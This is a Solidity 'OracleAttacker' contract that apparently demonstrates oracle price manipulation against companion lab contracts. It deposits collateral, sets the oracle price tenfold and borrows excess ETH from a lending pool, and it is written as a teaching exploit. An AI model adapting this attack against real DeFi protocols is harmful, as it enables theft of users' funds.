// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleOracle.sol";
import "./OracleLendingPool.sol";

// Attacker contract that manipulates the oracle to borrow more ETH than allowed.
contract OracleAttacker {
    SimpleOracle public oracle;
    OracleLendingPool public pool;

    // Initialize with addresses of the vulnerable oracle and lending pool
    constructor(address _oracle, address _pool) {
        oracle = SimpleOracle(_oracle);
        pool = OracleLendingPool(_pool);
    }

    // Attack sequence:
    // 1. Deposit a small amount of ETH as collateral
    // 2. Set the oracle price extremely high
    // 3. Borrow more ETH than you deserve
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");

        // Step 1: Deposit fake collateral (e.g., 1 ETH)
        pool.depositCollateral{value: msg.value}();

        // Step 2: Manipulate the oracle price to 10x (1 token = 10 ETH)
        oracle.setPrice(10 ether);

        // Step 3: Borrow from the pool based on inflated price
        pool.borrow();
    }

    // View balance of attacker contract (stolen funds)
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // Accept ETH sent to the contract
    receive() external payable {}
}
